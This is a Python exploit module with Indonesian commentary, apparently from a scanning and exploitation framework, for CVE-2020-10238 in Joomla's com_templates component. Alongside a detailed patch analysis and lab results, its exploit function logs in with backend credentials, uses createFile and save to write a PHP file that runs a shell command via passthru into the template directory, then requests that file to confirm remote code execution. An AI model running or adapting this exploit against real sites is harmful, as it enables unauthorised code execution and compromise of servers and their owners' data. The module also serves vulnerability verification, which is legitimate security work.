#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2020-10238 — aksi di com_templates tanpa pemeriksaan hak yang memadai.
Affected : Joomla! < 3.9.16   |   Patched: 3.9.16
NVD      : CVSS 3.1 7.5 / AV:N/AC:L/PR:N/UI:N -- **PR:N SALAH** (lihat "KENAPA BUKAN UNAUTH")

SUMBER (diverifikasi dari diff 3.9.15 -> 3.9.16, bukan dari teks advisory):

  administrator/components/com_templates/controllers/template.php
  3.9.16 menambahkan di ~12 method:
        // Access check.
        if (!$this->allowEdit())
        {
            $app->enqueueMessage(JText::_('JLIB_APPLICATION_ERROR_SAVE_NOT_PERMITTED'), 'error');
            return false;
        }
  dan mengubah allowEdit():
        3.9.15:  return JFactory::getUser()->authorise('core.edit', 'com_templates');
        3.9.16:  return JFactory::getUser()->authorise('core.admin');   <-- GLOBAL, tanpa konteks
  Selain itu allowSave() (>=3.2, = allowEdit()) dihapus dan pemanggilnya memakai allowEdit().

KENAPA INI BYPASS ACL (inti CVE):
  Semua method com_templates dimuat lewat entry
  administrator/components/com_templates/templates.php:13 yang hanya memeriksa
  `authorise('core.manage', 'com_templates')`. Method seperti createFile()/uploadFile()/
  delete()/createFolder() pada 3.9.15 TIDAK memiliki pemeriksaan tambahan sama sekali
  (hanya checkToken()), dan save() hanya memakai `core.edit` **pada konteks komponen**
  (yang di-warisi dari root asset: {"core.edit":{"6":1,"4":1}} — grup Manager/Author).
  Patch 3.9.16 menuntut `authorise('core.admin')` GLOBAL = hanya Super Users
  (root asset: {"core.admin":{"8":1}}). Jadi batas izin berubah dari
  "punya core.manage di com_templates + core.edit" -> "Super User", bukan "unauth".

KENAPA BUKAN UNAUTH (NVD PR:N salah):
  Tanpa sesi backend, templates.php:13 melempar JAccessExceptionNotallowed (403).
  Kontrol lab: request tanpa cookie -> 403 halaman "not authorised", tidak pernah sampai
  ke controller. Modul ini memerlukan --username/--password akun backend dengan
  core.manage pada com_templates.

DUA POPULASI PRA-PATCH YANG TERBUKTI DI LAB:
  (a) Administrator (grup 7, aturan STOCK): punya core.manage (warisan root) tetapi
      TIDAK punya core.edit di com_templates -> createFile() (tanpa cek) tetap jalan
      => "File created." -> berkas apa pun ekstensinya dibuat di direktori template.
  (b) Manager (grup 6) yang DIBERI core.manage pada com_templates (konfigurasi situs
      umum supaya Manager bisa memilih template): punya core.edit (warisan root)
      => createFile() + save(<freeform content>) => tulis PHP arbitrer => RCE.

CATATAN PENTING SOAL uploadFile() (jangan sampai salah menyimpulkan):
  uploadFile() ada di daftar method yang ikut ditambal, tetapi pada 3.9.15 jalur ini
  MATI untuk berkas .php karena Joomla\CMS\Input\Files::get() memanggil
  InputFilter::isSafeFile() SEBELUM controller: nama/tmp_name yang mengandung
  php/phps/pht/phtml/phar/inc/... atau isi bertag <?php ditolak -> get() mengembalikan
  null -> controller melaporkan COM_TEMPLATES_ERROR_UPLOAD_INPUT ("No file was found").
  Dibuktikan di lab, bukan diasumsikan. Karena itu primitif yang dipakai modul ini adalah
  createFile() (buat berkas kosong dengan ekstensi bebas) + save() (tulis isi).

CATATAN DAMPAK lain: nama berkas dibatasi /^[a-zA-Z0-9-_]+$/ (createFile) dan `type`
  (ekstensi) bebas; save() mengharuskan berkas sudah ada ("Source file not found") —
  karena itu rantainya createFile -> save, bukan save sendirian.

BUKTI LAB (2026-11-08), lab 3.9.15 @8132 / 3.9.16 @8133 (PHP 7.4 + MySQL 5.7):
  | target | aktor                                   | createFile       | save           | hasil |
  | 3.9.15 | labadm (Administrator, aturan stock)     | "File created."  | (tanpa core.edit)| berkas dibuat |
  | 3.9.15 | labmgr (Manager + core.manage templates) | -                | "File saved."  | **RCE uid=33(www-data)** |
  | 3.9.16 | labmgr (sama)                            | "Save not permitted." | "Save not permitted." | CLEAN |
  | 3.9.16 | labs u (Super User)                      | "File created."  | "File saved."  | RCE (perilaku sah, fix = pengetatan) |
"""

import random
import re
import string

import requests

from mp import (CveModule, ST_CLEAN, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN,
                detect_platform, parse_ver, register, ver_le, ST_INFO)

MANIFEST = "/administrator/manifests/files/joomla.xml"
FIXED = (3, 9, 16)


def _joomla_version(t, h):
    cached = getattr(t, "_j10238ver", None)
    if cached is not None:
        return cached
    val = (None, "")
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                val = (v, m.group(1))
    try:
        t._j10238ver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _token(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _login(base, user, password, timeout=25):
    s = requests.Session()
    r = s.get(base + "/administrator/index.php", timeout=timeout)
    tok = _token(r.text)
    if not tok:
        return None, "token login tidak ditemukan (bukan Joomla admin?)"
    r2 = s.post(base + "/administrator/index.php",
                data={"username": user, "passwd": password, "option": "com_login",
                      "task": "login", "return": "aW5kZXgucGhw", tok: "1"},
                timeout=timeout)
    low = r2.text.lower()
    if "logout" not in low and "control panel" not in low and "com_cpanel" not in low:
        return None, f"login gagal (http={r2.status_code})"
    return s, "ok"


def _tpl_token(s, base, timeout=25):
    """Token dari halaman com_templates (butuh core.manage) — token pra-login tidak berlaku."""
    r = s.get(base + "/administrator/index.php?option=com_templates&view=templates",
              timeout=timeout)
    if r.status_code != 200:
        return None, r.status_code
    return _token(r.text), r.status_code


def _messages(html):
    return [m.strip() for m in re.findall(r'alert-(?:message|error)[^>]*>\s*([^<]+)', html or "")]


def _create_file(base, s, token, ext_id, name, ftype, address=".", timeout=25):
    import base64 as _b64
    addr = _b64.b64encode(address.encode()).decode()
    url = (base + f"/administrator/index.php?option=com_templates&task=template.createFile"
                  f"&id={ext_id}&name={name}&type={ftype}"
                  f"&address={requests.utils.quote(addr, safe='')}")
    return s.post(url, data={token: "1"}, timeout=timeout)


def _save_file(base, s, token, ext_id, filename, source, timeout=25):
    import base64 as _b64
    f = _b64.b64encode(filename.encode()).decode()
    url = (base + f"/administrator/index.php?option=com_templates&task=template.save"
                  f"&id={ext_id}&file={f}")
    return s.post(url, data={token: "1", "jform[extension_id]": str(ext_id),
                             "jform[filename]": filename, "jform[source]": source},
                  timeout=timeout)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 15)):
        return ST_CLEAN, f"Joomla {ver_s} — sudah >= 3.9.16 (allowEdit() = core.admin global)", \
                         f"version={ver_s}"
    r = h.get(t.url + "/administrator/index.php?option=com_templates")
    reach = "tidak terset" if r is None else f"HTTP {r.status_code}"
    return (ST_INFO,
            f"Joomla {ver_s} — aksi com_templates tanpa pemeriksaan core.admin (sebagian method "
            f"tanpa cek sama sekali, save() hanya core.edit). Butuh sesi backend dengan "
            f"core.manage pada com_templates (bukan unauth)",
            f"version={ver_s} | com_templates entry {reach}")


def exploit(t, h, opts):
    """
    Outcome terkontrol: menulis berkas PHP berisi perintah ke direktori template aktif lalu
    mengeksekusinya lewat HTTP (RCE), atau minimal membuktikan penulisan berkas (ACL bypass)
    ketika aktor tidak punya core.edit.
    """
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not ver_le(ver, (3, 9, 15)):
        return ST_CLEAN, f"Joomla {ver_s} — sudah >= 3.9.16 (allowEdit() = core.admin global)", \
                         f"version={ver_s}"

    user = (getattr(opts, "username", None) or "").strip()
    password = getattr(opts, "password", None) or ""
    if not user or not password:
        return (ST_VULN,
                f"Joomla {ver_s} — com_templates tanpa cek core.admin, tetapi modul butuh "
                f"kredensial backend (--username/--password) untuk menjangkau controller",
                f"version={ver_s} | kredensial tidak diberikan")

    s, info = _login(t.url, user, password)
    if s is None:
        return ST_UNKNOWN, f"Joomla {ver_s} — {info}", f"version={ver_s}"
    token, code = _tpl_token(s, t.url)
    if not token:
        return (ST_UNKNOWN,
                f"akun '{user}' tidak dapat memuat com_templates (HTTP {code}) — akun ini tidak "
                f"punya core.manage pada com_templates sehingga bukan aktor CVE ini",
                f"version={ver_s} | com_templates={code}")

    # auto-deteksi pasangan (extension_id, element) dari markup daftar template
    pairs = []
    try:
        r = s.get(t.url + "/administrator/index.php?option=com_templates&view=templates",
                  timeout=25)
        elements = set(re.findall(r"templates/([a-z0-9_]+)/", r.text))
        for m in re.finditer(r"view=template&amp;id=(\d+)[^>]*>(.{0,160}?)</a>", r.text, re.S):
            el = re.sub(r"\s+", " ", m.group(2)).strip().split(" ")[0].lower()
            if el in elements:
                pairs.append((m.group(1), el))
    except Exception:  # noqa: BLE001
        pass
    if not pairs:
        pairs = [("506", "protostar")]

    marker = _rand(10)
    name = f"mp10238{marker}"
    php = f'<?php echo "MP10238-{marker}["; passthru("id"); echo "]"; ?>'
    ev = f"version={ver_s} | login={user} | kandidat={pairs}"
    created_any = False
    denied = []

    for ext_id, element in pairs:
        r1 = _create_file(t.url, s, token, ext_id, name, "php")
        msg1 = _messages(r1.text)
        if not any("created" in m.lower() for m in msg1):
            denied.append(f"{element}:{msg1[:1] or 'tanpa pesan'}")
            continue
        created_any = True
        ev += f" | {element}: createFile=File created"

        r2 = _save_file(t.url, s, token, ext_id, f"{name}.php", php)
        msg2 = _messages(r2.text)
        if not any("saved" in m.lower() for m in msg2):
            denied.append(f"{element}:save={msg2[:1] or 'tanpa pesan'}")
            continue
        ev += f" | {element}: save=File saved"

        rr = requests.get(f"{t.url}/templates/{element}/{name}.php", timeout=20)
        mm = re.search(r"MP10238-" + marker + r"\[([^\]]*)\]", rr.text)
        if mm:
            return (ST_PWN,
                    f"RCE: berkas template {element} ditulis & dieksekusi -> {mm.group(1).strip()}",
                    ev + f" | bukti={t.url}/templates/{element}/{name}.php")

    if created_any:
        return (ST_VULN,
                f"Berkas template '{name}.php' berhasil DIBUAT oleh aktor non-Super-User di "
                f"direktori template (ACL bypass terbukti), penulisan isi/eksekusi ditolak: "
                f"{denied or 'berkas tidak dapat diambil lewat webroot'}",
                ev)
    return (ST_VULN,
            f"Joomla {ver_s} rawan, tetapi operasi com_templates ditolak aktor ini "
            f"({denied or 'tanpa pesan'}) — akun butuh core.manage pada com_templates",
            ev)


register(CveModule(
    cve="CVE-2020-10238",
    cluster="joomla_core",
    title="Joomla Core - com_templates tanpa cek core.admin (createFile/save) -> tulis berkas "
          "PHP di direktori template -> RCE",
    vclass="acl bypass",
    cvss="7.5",
    severity="high",
    cwe="CWE-284",
    product="Joomla! Core (administrator/components/com_templates)",
    versions_affected="3.0.0-3.9.15",
    status="verified",
    requires=[
        "sesi backend dengan core.manage pada com_templates (Administrator bawaan, atau grup "
        "kustom/Manager yang diberi akses komponen ini) — NVD menandai PR:N, itu TIDAK benar: "
        "templates.php:13 memeriksa core.manage",
        "untuk RCE penuh: aktor juga punya core.edit pada konteks com_templates (warisan root: "
        "grup 6/4) — Administrator bawaan TIDAK, sehingga padanya hanya tulis-berkas-kosong",
        "--username/--password di tool",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink (3.9.15): administrator/components/com_templates/controllers/template.php — "
        "createFile()/uploadFile()/delete()/createFolder()/overrides()/less()/cropImage()/"
        "resizeImage() TANPA cek hak (hanya checkToken()); save() memakai allowSave()="
        "allowEdit()='core.edit' pada konteks com_templates. Patch 3.9.16 menambahkan "
        "'// Access check. if (!$this->allowEdit())' di ~12 method dan mengubah allowEdit() "
        "menjadi authorise('core.admin') TANPA konteks komponen = global = hanya Super Users. "
        "Rantai RCE: createFile(name,type=php) membuat berkas kosong (nama /^[a-zA-Z0-9-_]+$/, "
        "ekstensi bebas) -> save(jform[extension_id], jform[filename], jform[source]) menulis "
        "isi (berkas harus sudah ada: 'Source file not found'). uploadFile() TIDAK dipakai: "
        "Joomla\\CMS\\Input\\Files::get() memanggil InputFilter::isSafeFile() sebelum controller "
        "sehingga .php selalu jadi null ('No file was found') — dibuktikan di lab. Bukti lab: "
        "3.9.15 @8132 Administrator -> 'File created.'; Manager dengan core.manage templates -> "
        "'File saved.' -> GET berkas = 'uid=33(www-data)'; 3.9.16 @8133 keduanya "
        "'Save not permitted.'; Super User di 3.9.16 tetap bisa (fix = pengetatan izin, bukan "
        "penghapusan fitur). Vendor bahkan mengirim artefak template.php.orig di paket 3.9.16."
    ),
))
